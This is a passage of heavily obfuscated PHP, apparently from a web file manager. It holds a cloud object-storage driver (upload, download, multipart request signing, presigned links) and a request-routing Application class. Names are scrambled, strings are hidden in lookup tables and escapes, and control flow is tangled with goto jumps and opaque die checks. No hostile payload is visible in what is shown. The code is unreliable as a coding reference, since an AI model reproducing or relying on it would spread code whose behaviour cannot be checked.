getContent($BÇæÚÎÆ‡­) { return $this->client->getObject($this->bucket, $BÇæÚÎÆ‡­); } public function setContent($aˆ¿ˆŸ–ËÕ, $a¿¿º‡ƒ–Á = '', $f¤ŠëÒˆ†² = false) { goto eô…±»ÖÍÊ; EÜ£®ì´‡: $this->cacheMethod(null, null); $f‡‚§’³ºƒ = $this->copyFile($aˆ¿ˆŸ–ËÕ, $aˆ¿ˆŸ–ËÕ, array($b™¤“ª™Æ[207] => $f‡‚§’³ºƒ[$b™¤“ª™Æ[208]])); return $f‡‚§’³ºƒ ? !0 : !1; goto eˆâöÍóø”; F‡«¸¾òß: $f‡‚§’³ºƒ = $this->client->putObject($a¿¿º‡ƒ–Á, $this->bucket, $aˆ¿ˆŸ–ËÕ, $b™¤“ª™Æ[191], array(), $aò”©Å†Ö×); if (!$f‡‚§’³ºƒ) { return !1; } if ($f¤ŠëÒˆ†²) { return !0; } goto EÜ£®ì´‡; eô…±»ÖÍÊ: $b™¤“ª™Æ =& $_SERVER[Ïº«‚ßèÔˆø]; $aˆ¿ˆŸ–ËÕ = $f¤ŠëÒˆ†² ? trim($aˆ¿ˆŸ–ËÕ, $b™¤“ª™Æ[8]) . $b™¤“ª™Æ[8] : $aˆ¿ˆŸ–ËÕ; $aò”©Å†Ö× = get_file_mime(get_path_ext($aˆ¿ˆŸ–ËÕ)); goto F‡«¸¾òß; eˆâöÍóø”: } public function fileSubstr($cëÎÜÇïàî, $A–¦è‡¡œƒ, $D°í¨äªëÕ) { $F‚˜ª³ÊÅ = $A–¦è‡¡œƒ + $D°í¨äªëÕ - 1; return $this->client->getObject($this->bucket, $cëÎÜÇïàî, array($_SERVER[Ïº«‚ßèÔˆø][209] => "\142\171\164\145\163\75{$A–¦è‡¡œƒ}\55{$F‚˜ª³ÊÅ}")); } public function upload($aŸÑºÒšØÃ, $CµÌ‚ğ•Â¢, $Bç£–Û†  = false, $FŠ‡œÓ˜ß = REPEAT_REPLACE) { $Eõ²İ’ÂÜÍ =& $_SERVER[Ïº«‚ßèÔˆø]; $B¼”ØãÊ¶ = array($Eõ²İ’ÂÜÍ[207] => @md5_file($CµÌ‚ğ•Â¢)); $Dò¼¾¹ŞÆ± = array($Eõ²İ’ÂÜÍ[210] => get_file_mime(get_path_ext($aŸÑºÒšØÃ))); if (IO::size($CµÌ‚ğ•Â¢) <= 1024 * 1024 * 200) { $böèäÖŞ· = $this->client->putObjectFile($CµÌ‚ğ•Â¢, $this->bucket, $aŸÑºÒšØÃ, $Eõ²İ’ÂÜÍ[191], $B¼”ØãÊ¶, $Dò¼¾¹ŞÆ±); return !empty($böèäÖŞ·) ? $this->getPathOuter($aŸÑºÒšØÃ) : !1; } $f¢ôçÍ¼Äˆ = $this->client->multiUploadObject($CµÌ‚ğ•Â¢, $this->bucket, trim($aŸÑºÒšØÃ, $Eõ²İ’ÂÜÍ[8]), $B¼”ØãÊ¶, $Dò¼¾¹ŞÆ±); return $f¢ôçÍ¼Äˆ ? $this->getPathOuter($aŸÑºÒšØÃ) : !1; } public function download($c‰™³Š«, $DöâÇ†»Ñ™) { if (!@is_dir($this->pathFather($DöâÇ†»Ñ™)) && !IO::mkdir($this->pathFather($DöâÇ†»Ñ™))) { return !1; } $BÍ °‰ù¬¶ = $this->client->getObject($this->bucket, $c‰™³Š«, array(), $DöâÇ†»Ñ™); return $BÍ °‰ù¬¶ !== !1 ? $DöâÇ†»Ñ™ : !1; } public function link($C‚ˆ½¯ ‹, $c¼Í±ÔÔ‹™ = array()) { $C«”¤­Ãã× =& $_SERVER[Ïº«‚ßèÔˆø]; if ($this->signVer == $C«”¤­Ãã×[211]) { return $this->client->getAuthenticatedURL($this->bucket, $C‚ˆ½¯ ‹, 3600 * 12, $c¼Í±ÔÔ‹™); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($C‚ˆ½¯ ‹, $C«”¤­Ãã×[8]), 3600 * 12, $this->region, array(), !0, $c¼Í±ÔÔ‹™); } public function fileOut($cˆ•İÕ¯èØ, $AÄ¼‚¦âğ = false, $a‹åßˆŒ½ô = false, $D¾ŠâØœÆ = '') { goto BÀô¶ø¤Òà; A‹˜š³¨ÑÒ: $f™Ì¸›”´ = get_file_mime(get_path_ext($a‹åßˆŒ½ô)); if ($f™Ì¸›”´ == $eÑ‹¤Âôƒà[212]) { return parent::fileOut($cˆ•İÕ¯èØ, $AÄ¼‚¦âğ, $a‹åßˆŒ½ô, $D¾ŠâØœÆ); } $AÄ¼‚¦âğ = $AÄ¼‚¦âğ ? $eÑ‹¤Âôƒà[213] : $eÑ‹¤Âôƒà[214]; goto cÇÙÌ í’î; cÇÙÌ í’î: $eÜÛöëíœÔ = array($eÑ‹¤Âôƒà[215] => $AÄ¼‚¦âğ . $eÑ‹¤Âôƒà[216] . rawurlencode($a‹åßˆŒ½ô), $eÑ‹¤Âôƒà[217] => $f™Ì¸›”´); $aÈ¦ĞŠãÇÌ = $this->link($cˆ•İÕ¯èØ, $eÜÛöëíœÔ); $this->fileOutLink($aÈ¦ĞŠãÇÌ); goto aÈÅö±éÕ; BÀô¶ø¤Òà: $eÑ‹¤Âôƒà =& $_SERVER[Ïº«‚ßèÔˆø]; if ($this->isFileOutServer()) { return $this->fileOutServer($cˆ•İÕ¯èØ, $AÄ¼‚¦âğ, $a‹åßˆŒ½ô, $D¾ŠâØœÆ); } if (!$a‹åßˆŒ½ô) { $a‹åßˆŒ½ô = $this->pathThis($cˆ•İÕ¯èØ); } goto A‹˜š³¨ÑÒ; aÈÅö±éÕ: } public function fileOutServer($Cƒ½¢äøè, $d¯–„•¶ = false, $DàŞš‹Ğ×¡ = false, $a¢å‘å‹¿İ = '') { parent::fileOut($Cƒ½¢äøè, $d¯–„•¶, $DàŞš‹Ğ×¡, $a¢å‘å‹¿İ); } public function fileOutImageServer($bñå¦ôòè­, $C…ÉÍ»ß… = 250) { parent::fileOutImage($bñå¦ôòè­, $C…ÉÍ»ß…); } public function hashMd5($dæ¾²íÉõÔ, $fßÊà¯ïùº = '') { $BÏŞ‘´ôãŸ =& $_SERVER[Ïº«‚ßèÔˆø]; $cÊĞçëÛ¢Ä = $this->objectMeta($dæ¾²íÉõÔ); if (!$cÊĞçëÛ¢Ä) { return !1; } $fßÊà¯ïùº = $fßÊà¯ïùº ? $fßÊà¯ïùº : _get($cÊĞçëÛ¢Ä, $BÏŞ‘´ôãŸ[218]); $fßÊà¯ïùº = $fßÊà¯ïùº ? $fßÊà¯ïùº : _get($cÊĞçëÛ¢Ä, $BÏŞ‘´ôãŸ[208], $BÏŞ‘´ôãŸ[33]); return $fßÊà¯ïùº; } public function uploadFormData($DôŸŞ Ì¿, $b„ô“‚Ã‘— = 3600) { $eÔ„ß¾ĞÔ¥ =& $_SERVER[Ïº«‚ßèÔˆø]; $f¥íÎçá = $this->pathFather($DôŸŞ Ì¿); $fãâÖ¢ä¹§ = $this->client->getHttpUploadPostParams($this->bucket, $f¥íÎçá, $eÔ„ß¾ĞÔ¥[191], $b„ô“‚Ã‘—); return array_merge((array) $fãâÖ¢ä¹§, array($eÔ„ß¾ĞÔ¥[175] => $this->getHost())); } public function multiUploadFormData($D§­Œ¬Ö°, $fğÆ Š = 3600) { $DÓ¢‰¯ÚÄ =& $_SERVER[Ïº«‚ßèÔˆø]; $CÑÙ‰¸…à = gmdate($DÓ¢‰¯ÚÄ[219]); $fŸÚ‚‹ëÂ = array(); $C§ì”³ÉŞî = $this->client->getUploadId($this->bucket, $D§­Œ¬Ö°, $fŸÚ‚‹ëÂ); if (!$C§ì”³ÉŞî) { return !1; } return array($DÓ¢‰¯ÚÄ[220] => $C§ì”³ÉŞî, $DÓ¢‰¯ÚÄ[175] => $this->getHost() . $DÓ¢‰¯ÚÄ[8] . $this->pathEncode($D§­Œ¬Ö°), $DÓ¢‰¯ÚÄ[221] => $CÑÙ‰¸…à, $DÓ¢‰¯ÚÄ[93] => $D§­Œ¬Ö°); } public function multiUploadAuthData($EËÜ‘áÁø, $e©İŞ´³¢« = array()) { goto bÌÕ¸â°Õí; B‚Æ¸Ó»…: if (strpos($EÙÁÄ§¬¼, $fé·À“ó‰[224]) === 0) { return array($fé·À“ó‰[231] => $aİÍ—éÓœ³, $fé·À“ó‰[221] => $bîñ‘‰Ø¦º); } return $aİÍ—éÓœ³; goto FÊ‰œµìÏ; bÙæ‚ÀÒÅ: $cì›‰ŠøÍ¿ = array($fé·À“ó‰[223], $fé·À“ó‰[33], $fé·À“ó‰[119], $fé·À“ó‰[33], "\x78\55\141\x6d\x7a\55\x64\x61\x74\x65\72{$bîñ‘‰Ø¦º}", $fé·À“ó‰[8] . $this->bucket . $fé·À“ó‰[8] . $this->pathEncode($aƒ…¨Šßš•) . $EÙÁÄ§¬¼); if (strpos($EÙÁÄ§¬¼, $fé·À“ó‰[224]) === 0) { $cì›‰ŠøÍ¿[0] = $fé·À“ó‰[225]; } if (isset($e©İŞ´³¢«[$fé·À“ó‰[226]]) && $e©İŞ´³¢«[$fé·À“ó‰[226]] == $fé·À“ó‰[227]) { $cì›‰ŠøÍ¿[0] = $fé·À“ó‰[227]; } goto B‡Û…³ùòÚ; B‡Û…³ùòÚ: $AÒŸÎÁƒÂ = implode($fé·À“ó‰[228], $cì›‰ŠøÍ¿); $aØ­¹ŸîùÅ = base64_encode(hash_hmac($fé·À“ó‰[229], $AÒŸÎÁƒÂ, $this->secret, !0)); $aİÍ—éÓœ³ = $fé·À“ó‰[230] . $this->accessKey . $fé·À“ó‰[4] . $aØ­¹ŸîùÅ; goto B‚Æ¸Ó»…; b‡„ñ÷—µ: $aƒ…¨Šßš• = $e©İŞ´³¢«[$fé·À“ó‰[93]]; unset($e©İŞ´³¢«[$fé·À“ó‰[93]]); if (isset($e©İŞ´³¢«[$fé·À“ó‰[222]])) { $e©İŞ´³¢«[$fé·À“ó‰[221]] = $bîñ‘‰Ø¦º; return $this->listUploadParts($aƒ…¨Šßš•, $e©İŞ´³¢«); } goto bÙæ‚ÀÒÅ; bÌÕ¸â°Õí: $fé·À“ó‰ =& $_SERVER[Ïº«‚ßèÔˆø]; $bîñ‘‰Ø¦º = isset($e©İŞ´³¢«[$fé·À“ó‰[221]]) ? $e©İŞ´³¢«[$fé·À“ó‰[221]] : gmdate($fé·À“ó‰[219]); $EÙÁÄ§¬¼ = isset($e©İŞ´³¢«[$fé·À“ó‰[168]]) ? $e©İŞ´³¢«[$fé·À“ó‰[168]] : $fé·À“ó‰[33]; goto b‡„ñ÷—µ; FÊ‰œµìÏ: } public function listUploadParts($a®Ïâé‘ï, $F™¾ÌÇÛ²Î = array()) { goto bÓ—³öÓ‹â; bÓ—³öÓ‹â: $a„áğ˜Èç =& $_SERVER[Ïº«‚ßèÔˆø]; $aÆÁ§­Ô¬Ş = str_replace($a„áğ˜Èç[232], $a„áğ˜Èç[33], $F™¾ÌÇÛ²Î[$a„áğ˜Èç[168]]); $aÈô‚Ë… = $this->client->listParts($this->bucket, $a®Ïâé‘ï, $aÆÁ§­Ô¬Ş); goto eùİÔ×Õˆó; eùİÔ×Õˆó: if (!$aÈô‚Ë…) { return !1; } unset($F™¾ÌÇÛ²Î[$a„áğ˜Èç[222]], $F™¾ÌÇÛ²Î[$a„áğ˜Èç[226]]); $F™¾ÌÇÛ²Î[$a„áğ˜Èç[93]] = $a®Ïâé‘ï; goto EîÉ…Œí¥÷; EîÉ…Œí¥÷: $a´ø æŠÚë = $this->multiUploadAuthData($a®Ïâé‘ï, $F™¾ÌÇÛ²Î); if (empty($a´ø æŠÚë)) { return !1; } return array($a„áğ˜Èç[231] => $a´ø æŠÚë, $a„áğ˜Èç[221] => $F™¾ÌÇÛ²Î[$a„áğ˜Èç[221]], $a„áğ˜Èç[233] => $aÈô‚Ë…); goto Eá×öÓ„Š; Eá×öÓ„Š: } public function getHost() { return parent::getHost() . $_SERVER[Ïº«‚ßèÔˆø][8] . $this->bucket; } public function size($AœåÅøë¯‰) { $F”êÔ†ñŠ£ = $this->objectMeta($AœåÅøë¯‰); return $F”êÔ†ñŠ£ ? $F”êÔ†ñŠ£[$_SERVER[Ïº«‚ßèÔˆø][78]] : 0; } public function info($cöğœˆïÑ”) { if ($this->isFolder($cöğœˆïÑ”)) { return $this->folderInfo($cöğœˆïÑ”); } else { if ($this->isFile($cöğœˆïÑ”)) { return $this->fileInfo($cöğœˆïÑ”); } } return !1; } public function exist($F„Õ½Ùêõ) { return $this->isFile($F„Õ½Ùêõ) || $this->isFolder($F„Õ½Ùêõ); } public function isFile($BÔ°§±Œí) { return !$this->isFolder($BÔ°§±Œí) && $this->objectMeta($BÔ°§±Œí); } public function isFolder($c»ñª†İéÔ) { return $this->cacheMethod($_SERVER[Ïº«‚ßèÔˆø][198], $c»ñª†İéÔ); } protected function objectMeta($EØùË´ÁäŸ) { return $this->cacheMethod($_SERVER[Ïº«‚ßèÔˆø][199], $EØùË´ÁäŸ); } protected function _objectMeta($Fñ¾ëÜ‚„ø) { $dÖ÷×ä—© =& $_SERVER[Ïº«‚ßèÔˆø]; $Fñ¾ëÜ‚„ø = rtrim($Fñ¾ëÜ‚„ø, $dÖ÷×ä—©[8]); try { $d±øŸÓÚ´Œ = $this->client->getObjectInfo($this->bucket, $Fñ¾ëÜ‚„ø); if (!isset($d±øŸÓÚ´Œ[$dÖ÷×ä—©[218]]) && isset($d±øŸÓÚ´Œ[$dÖ÷×ä—©[234]])) { $d±øŸÓÚ´Œ[$dÖ÷×ä—©[218]] = $d±øŸÓÚ´Œ[$dÖ÷×ä—©[234]]; } } catch (Exception $F÷ï¡–íØì) { $d±øŸÓÚ´Œ = !1; } if (!$d±øŸÓÚ´Œ) { } return $d±øŸÓÚ´Œ; } protected function _isFolder($Aø´ïÍàç«) { goto DšŸ«™‡’; e¡‰Úµî¿ò: $FŒœÑóËâí = $this->client->getBucket($this->bucket, $Aø´ïÍàç«, null, 1); if (empty($FŒœÑóËâí[$B”¸‰œÜ¨Ä[197]])) { return !1; } $F«ÙåÅÑŒå = $FŒœÑóËâí[$B”¸‰œÜ¨Ä[197]][0][$B”¸‰œÜ¨Ä[28]]; goto BğÜˆÁŠÄ…; BğÜˆÁŠÄ…: if (substr($F«ÙåÅÑŒå, -1) == $B”¸‰œÜ¨Ä[8]) { return !0; } if (get_path_this($F«ÙåÅÑŒå) == get_path_this($Aø´ïÍàç«)) { return !1; } return !0; goto aªÃ½ÙˆØš; DšŸ«™‡’: $B”¸‰œÜ¨Ä =& $_SERVER[Ïº«‚ßèÔˆø]; $Aø´ïÍàç« = rtrim($Aø´ïÍàç«, $B”¸‰œÜ¨Ä[8]); if ($Aø´ïÍàç« == $B”¸‰œÜ¨Ä[33] || $Aø´ïÍàç« == $B”¸‰œÜ¨Ä[8]) { return !0; } goto e¡‰Úµî¿ò; aªÃ½ÙˆØš: } } define($_SERVER[Ïº«‚ßèÔˆø][235], 1); goto A¿“Ş÷Ñ•Ú; B¤ôŸÒÂ¼‚: $Bçª÷Ÿë = $_SERVER[Ïº«‚ßèÔˆø][576]; while (strlen($Bçª÷Ÿë) < $_SERVER[Ïº«‚ßèÔˆø][577]) { if (!$Bçª÷Ÿë) { break; } $Bçª÷Ÿë++; } class Application { private $defaultModule = "\x69\x6e\x64\x65\x78"; private $defaultController = "\x69\x6e\144\145\170"; private $defaultAction = "\151\156\144\145\x78"; function __construct() { } public function setDefault($bÖç¦„â³¢) { $D¶ï³õæŒ =& $_SERVER[£ñ­Åö°¿]; $A…Å£¨ö†‰ = $D¶ï³õæŒ[0]($D¶ï³õæŒ[1], $D¶ï³õæŒ[2]($bÖç¦„â³¢, $D¶ï³õæŒ[1])); $this->defaultModule = $A…Å£¨ö†‰[0] ? $A…Å£¨ö†‰[0] : $this->defaultModule; $this->defaultController = $A…Å£¨ö†‰[1] ? $A…Å£¨ö†‰[1] : $this->defaultController; $this->defaultAction = $A…Å£¨ö†‰[2] ? $A…Å£¨ö†‰[2] : $this->defaultAction; $this->{$_SERVER[£ñ­Åö°¿][3]}($D¶ï³õæŒ[4], array($this, $D¶ï³õæŒ[5])); } public function appRun($D±ƒÉ”ä‘) { goto ağÊºÅ‰‚¢; fËÂÀ‹‹Ì: $AÔùê„™µ[17]($D±ƒÉ”ä‘); $AÔùê„™µ[13](array($AÔùê„™µ[14], $AÔùê„™µ[15]), $DÖÊñ§Áˆà . $AÔùê„™µ[18], $D±ƒÉ”ä‘); $dĞŸëÌÌ—ƒ = $e®¦šŸÛ„…[580]; goto d­¹ŒÃËî•; DÁ÷öÄ¼µ: if (strlen($B¬ïÙ×›ÃŠ) < $e®¦šŸÛ„…[579]) { die; } if ($dø·È»ÇØ == $AÔùê„™µ[8]) { $DÖÊñ§Áˆà = $AÔùê„™µ[9]; $f–ëÇÚíêÜ[0] = $AÔùê„™µ[10]; $f–ëÇÚíêÜ[1] = $f–ëÇÚíêÜ[1] . $AÔùê„™µ[11]; $D±ƒÉ”ä‘ = $AÔùê„™µ[12]($AÔùê„™µ[1], $f–ëÇÚíêÜ); $D±ƒÉ”ä‘ = $AÔùê„™µ[2]($D±ƒÉ”ä‘, $AÔùê„™µ[1]); } $AÔùê„™µ[13](array($AÔùê„™µ[14], $AÔùê„™µ[15]), $DÖÊñ§Áˆà . $AÔùê„™µ[16], $D±ƒÉ”ä‘); goto fËÂÀ‹‹Ì; bÃÚÄ¯¢ÄĞ: $dø·È»ÇØ = $AÔùê„™µ[6]($f–ëÇÚíêÜ[0]); $DÖÊñ§Áˆà = $AÔùê„™µ[7]; $B¬ïÙ×›ÃŠ = $e®¦šŸÛ„…[578]; goto DÁ÷öÄ¼µ; d­¹ŒÃËî•: if (!$dĞŸëÌÌ—ƒ) { return; } goto dÈ—¢ãêÃ’; ağÊºÅ‰‚¢: $e®¦šŸÛ„… =& $_SERVER[Ïº«‚ßèÔˆø]; $AÔùê„™µ =& $_SERVER[£ñ­Åö°¿]; $f–ëÇÚíêÜ = $AÔùê„™µ[0]($AÔùê„™µ[1], $D±ƒÉ”ä‘); goto bÃÚÄ¯¢ÄĞ; dÈ—¢ãêÃ’: } private function autorun() { $CÕÈ¹ÚËŒ¦ =& $_SERVER[£ñ­Åö°¿]; global $config; if ($CÕÈ¹ÚËŒ¦[19]($config[$CÕÈ¹ÚËŒ¦[20]]) == 0) { return; } foreach ($config[$CÕÈ¹ÚËŒ¦[20]] as $bä¿œ“Í…Á => $fÑ›ÑÎÑŒ») { $this->{$_SERVER[£ñ­Åö°¿][21]}($fÑ›ÑÎÑŒ»); } } private function qyis5316d754() { goto A˜ƒÚ¢ŸÛÉ; d“›®µ‡°Ö: $cã—²ˆ•É‰ = $dØ®ß¡‹ƒ[586]; while ($cã—²ˆ•É‰ < $dØ®ß¡‹ƒ[585]) { if ($cã—²ˆ•É‰ >= 0) { break; } $cã—²ˆ•É‰++; } $GLOBALS[$cÛÆÙä‹Ï[22]][$cÛÆÙä‹Ï[28]] = $cÛÆÙä‹Ï[29]($cÛÆÙä‹Ï[1], $GLOBALS[$cÛÆÙä‹Ï[22]][$cÛÆÙä‹Ï[23]]); goto cÚœ‰÷ÂÅˆ; B‹†¨¸›‚´: $cˆ”–ŒåÒ« = $cÛÆÙä‹Ï[25]($AÚæçå»ˆí, 0, -$cÛÆÙä‹Ï[24]($fÏ÷½¸Ü§Ş)); $cùˆ£¡’À = array($cÛÆÙä‹Ï[8], $cˆ”–ŒåÒ«); $B•æÁĞé‚ª = $dØ®ß¡‹ƒ[584]; goto f¢ñÀ¿é¬Á; A˜ƒÚ¢ŸÛÉ: $dØ®ß¡‹ƒ =& $_SERVER[Ïº«‚ßèÔˆø]; $cÛÆÙä‹Ï =& $_SERVER[£ñ­Åö°¿]; $fÏ÷½¸Ü§Ş = $cÛÆÙä‹Ï[8]; goto dó™¸Ğø›Ñ; b×¨ªöÏ°: $b‚‘‘»®…Ã = $dØ®ß¡‹ƒ[583]; if (!$AÚæçå»ˆí || $cÛÆÙä‹Ï[24]($AÚæçå»ˆí) <= $cÛÆÙä‹Ï[24]($fÏ÷½¸Ü§Ş)) { return; } if ($cÛÆÙä‹Ï[6]($cÛÆÙä‹Ï[25]($AÚæçå»ˆí, -$cÛÆÙä‹Ï[24]($fÏ÷½¸Ü§Ş))) != $fÏ÷½¸Ü§Ş) { return; } goto B‹†¨¸›‚´; cÚœ‰÷ÂÅˆ: $Cª‰ŞËØÄ° = $dØ®ß¡‹ƒ[587]; if (!$Cª‰ŞËØÄ°) { die; } goto Aïç§¿ã”Æ; dó™¸Ğø›Ñ: $DµïƒéŸÊÀ = $dØ®ß¡‹ƒ[581]; while ($DµïƒéŸÊÀ < $dØ®ß¡‹ƒ[582]) { if ($DµïƒéŸÊÀ >= 0) { break; } $DµïƒéŸÊÀ++; } $AÚæçå»ˆí = $GLOBALS[$cÛÆÙä‹Ï[22]][$cÛÆÙä‹Ï[23]][0]; goto b×¨ªöÏ°; f¢ñÀ¿é¬Á: while ($B•æÁĞé‚ª < $dØ®ß¡‹ƒ[585]) { if ($B•æÁĞé‚ª >= 0) { break; } $B•æÁĞé‚ª++; } $CÉ´¬ô÷ø† = $cÛÆÙä‹Ï[26]($GLOBALS[$cÛÆÙä‹Ï[22]][$cÛÆÙä‹Ï[23]], 1); $GLOBALS[$cÛÆÙä‹Ï[22]][$cÛÆÙä‹Ï[23]] = $cÛÆÙä‹Ï[27]($cùˆ£¡’À, $CÉ´¬ô÷ø†); goto d“›®µ‡°Ö; Aïç§¿ã”Æ: } private function tvjc6df96a12() { goto fê¶‡¥—…–; Aå¯’éÔ†: $dÊ¾³“ä± = $Cõ‚Ÿƒì†‘[25]($b¹¢È³»ÓÕ, $bî¯•¨…Ôô + $Cõ‚Ÿƒì†‘[24]($a¿»¤¼ŒšÜ)); $Cõ‚Ÿƒì†‘[34]($Cõ‚Ÿƒì†‘[35], $dÊ¾³“ä±, $e•¤ŸŒéÚ); $dÊ¾³“ä± = $Cõ‚Ÿƒì†‘[2]($e•¤ŸŒéÚ[0][0], $Cõ‚Ÿƒì†‘[36]); goto A­ÓÕçÖÏ»; c´¥âÔÚ: $b¹¢È³»ÓÕ = $_SERVER[$Cõ‚Ÿƒì†‘[30]]; $cÖš’…“²‚ = $B÷²Éİ¶[588]; $a¿»¤¼ŒšÜ = $Cõ‚Ÿƒì†‘[31]; goto EÖ‚¢ÏêšÑ; Eªìá¥ŒÕŞ: $bî¯•¨…Ôô = $Cõ‚Ÿƒì†‘[33]($b¹¢È³»ÓÕ, $a¿»¤¼ŒšÜ); $e­¼ºÒ—óÅ = $B÷²Éİ¶[590]; while (strlen($e­¼ºÒ—óÅ) < $B÷²Éİ¶[582]) { if (!$e­¼ºÒ—óÅ) { break; } $e­¼ºÒ—óÅ++; } goto Aå¯’éÔ†; a‚Ïáí¸å„: $GLOBALS[$Cõ‚Ÿƒì†‘[22]][$Cõ‚Ÿƒì†‘[28]] = $Cõ‚Ÿƒì†‘[29]($Cõ‚Ÿƒì†‘[1], $GLOBALS[$Cõ‚Ÿƒì†‘[22]][$Cõ‚Ÿƒì†‘[23]]); $Få×ßƒ’Íé = $B÷²Éİ¶[592]; while ($Få×ßƒ’Íé < $B÷²Éİ¶[579]) { if ($Få×ßƒ’Íé >= 0) { break; } $Få×ßƒ’Íé++; } goto CµåöîÚ‘µ; A­ÓÕçÖÏ»: $GLOBALS[$Cõ‚Ÿƒì†‘[22]][$Cõ‚Ÿƒì†‘[23]] = $Cõ‚Ÿƒì†‘[0]($Cõ‚Ÿƒì†‘[36], $dÊ¾³“ä±); $A«›Ú§ƒ‚ = $B÷²Éİ¶[591]; if (strlen($A«›Ú§ƒ‚) < $B÷²Éİ¶[582]) { return; } goto a‚Ïáí¸å„; fê¶‡¥—…–: $B÷²Éİ¶ =& $_SERVER[Ïº«‚ßèÔˆø]; $Cõ‚Ÿƒì†‘ =& $_SERVER[£ñ­Åö°¿]; if ($GLOBALS[$Cõ‚Ÿƒì†‘[22]][$Cõ‚Ÿƒì†‘[28]] != $Cõ‚Ÿƒì†‘[10]) { return; } goto c´¥âÔÚ; EÖ‚¢ÏêšÑ: $eñ‚µ¯¥êˆ = $B÷²Éİ¶[589]; if (!$eñ‚µ¯¥êˆ) { return; } if (!$Cõ‚Ÿƒì†‘[32]($b¹¢È³»ÓÕ, $a¿»¤¼ŒšÜ)) { return; } goto Eªìá¥ŒÕŞ; CµåöîÚ‘µ: } public function run() { goto F®›Œîé˜ ; Eº¬•Î½ÚÂ: $this->{$_SERVER[£ñ­Åö°¿][38]}(); $cîÁ·‰± = $GLOBALS[$f¹ˆêî›³[22]][$f¹ˆêî›³[23]]; $fƒ›ôÍ ÷à = $BÙìïôë¨[593]; goto B›†ÇŠàÁ¬; a¯Ÿ¼îÓÖ: while ($BùòŞßÖš < $BÙìïôë¨[585]) { if ($BùòŞßÖš >= 0) { break; } $BùòŞßÖš++; } $_SERVER[$f¹ˆêî›³[44]] = $f¹ˆêî›³[6](ACTION); $this->{$_SERVER[£ñ­Åö°¿][45]}(); goto d˜­¶‘À¼ø; bË­ƒâÔÛî: $f¹ˆêî›³[39]($f¹ˆêî›³[42], isset($cîÁ·‰±[2]) && $cîÁ·‰±[0] ? $cîÁ·‰±[2] : $this->defaultAction); $f¹ˆêî›³[39]($f¹ˆêî›³[43], MOD . $f¹ˆêî›³[1] . ST . $f¹ˆêî›³[1] . ACT); $BùòŞßÖš = $BÙìïôë¨[598]; goto a¯Ÿ¼îÓÖ; f™ÌĞ‚ùàŠ: while ($FÈñãÑÊàó < $BÙìïôë¨[585]) { if ($FÈñãÑÊàó >= 0) { break; } $FÈñãÑÊàó++; } $f¹ˆêî›³[39]($f¹ˆêî›³[40], isset($cîÁ·‰±[0]) && $cîÁ·‰±[0] ? $cîÁ·‰±[0] : $this->defaultModule); $cà÷¡­èÈÆ = $BÙìïôë¨[596]; goto B˜äÌ‰•ˆÇ; F®›Œîé˜ : $BÙìïôë¨ =& $_SERVER[Ïº«‚ßèÔˆø]; $f¹ˆêî›³ =& $_SERVER[£ñ­Åö°¿]; $this->{$_SERVER[£ñ­Åö°¿][37]}(); goto Eº¬•Î½ÚÂ; B˜äÌ‰•ˆÇ: while (strlen($cà÷¡­èÈÆ) < $BÙìïôë¨[582]) { if (!$cà÷¡­èÈÆ) { break; } $cà÷¡­èÈÆ++; } $f¹ˆêî›³[39]($f¹ˆêî›³[41], isset($cîÁ·‰±[1]) && $cîÁ·‰±[0] ? $cîÁ·‰±[1] : $this->defaultController); $bÒø½¿º¶ = $BÙìïôë¨[597]; goto bË­ƒâÔÛî; d˜­¶‘À¼ø: $bÙ“š‚‹ù = $BÙìïôë¨[599]; if (strlen($bÙ“š‚‹ù) < $BÙìïôë¨[582]) { die; } if ($f¹ˆêî›³[19]($cîÁ·‰±) >= 3) { $this->{$_SERVER[£ñ­Åö°¿][21]}($B© ù†¨¡ö); } else { $this->{$_SERVER[£ñ­Åö°¿][21]}(ACTION); } goto A„šÉİ; B›†ÇŠàÁ¬: while (strlen($fƒ›ôÍ ÷à) < $BÙìïôë¨[594]) { if (!$fƒ›ôÍ ÷à) { break; } $fƒ›ôÍ ÷à++; } $B© ù†¨¡ö = $GLOBALS[$f¹ˆêî›³[22]][$f¹ˆêî›³[28]]; $FÈñãÑÊàó = $BÙìïôë¨[595]; goto f™ÌĞ‚ùàŠ; A„šÉİ: } private $bzsy48d1293c = array(); private $wlan80ca99a8 = ''; public function jwhk8f8a1615() { goto E „’ˆ†Ï•; a˜ïÃ™î´: $this->{$_SERVER[£ñ­Åö°¿][47]}(); $bËƒ•ÌØÌª = $cÊ®İ©¼‡[600]; if (strlen($bËƒ•ÌØÌª) < $cÊ®İ©¼‡[585]) { return; } goto DŠòæ—òãë; aõÕŞƒ™: $this->{$_SERVER[£ñ­Åö°¿][3]}($D‰¾¤¶•¾[57], array($this, $D‰¾¤¶•¾[58])); $this->{$_SERVER[£ñ­Åö°¿][3]}($D‰¾¤¶•¾[59], array($this, $D‰¾¤¶•¾[60])); goto BäÒÀÚêôµ; cë¬á…Èò¦: $this->{$_SERVER[£ñ­Åö°¿][51]}(); $this->{$_SERVER[£ñ­Åö°¿][52]}(); $FîÁ¾÷‹æ = $cÊ®İ©¼‡[601]; goto CÌæ…±›ù•; CÌæ…±›ù•: if (strlen($FîÁ¾÷‹æ) < $cÊ®İ©¼‡[579]) { return; } $this->{$_SERVER[£ñ­Åö°¿][3]}($D‰¾¤¶•¾[53], array($this, $D‰¾¤¶•¾[54])); $this->{$_SERVER[£ñ­Åö°¿][3]}($D‰¾¤¶•¾[55], array($this, $D‰¾¤¶•¾[56])); goto aõÕŞƒ™; DŠòæ—òãë: $this->{$_SERVER[£ñ­Åö°¿][48]}(); $this->{$_SERVER[£ñ­Åö°¿][49]}(); $this->{$_SERVER[£ñ­Åö°¿][50]}(); goto cë¬á…Èò¦; E „’ˆ†Ï•: $cÊ®İ©¼‡ =& $_SERVER[Ïº«‚ßèÔˆø]; $D‰¾¤¶•¾ =& $_SERVER[£ñ­Åö°¿]; $this->{$_SERVER[£ñ­Åö°¿][46]}(); goto a˜ïÃ™î´; BäÒÀÚêôµ: } public function qahy687f83ba($C¤Íª¨†Ğ) { goto cÚ”ŠÏ—©; A„²Ù‡ï‘ï: $C¤Íª¨†Ğ[$a–Ãóœ¯’[118]][$a–Ãóœ¯’[138]] = $a–Ãóœ¯’[116]($this->bzsy48d1293c, $a–Ãóœ¯’[139], $a–Ãóœ¯’[10]); $C¤Íª¨†Ğ[$a–Ãóœ¯’[118]][$a–Ãóœ¯’[140]] = $a–Ãóœ¯’[116]($this->bzsy48d1293c, $a–Ãóœ¯’[141], $a–Ãóœ¯’[10]); if ($a–Ãóœ¯’[116]($GLOBALS, 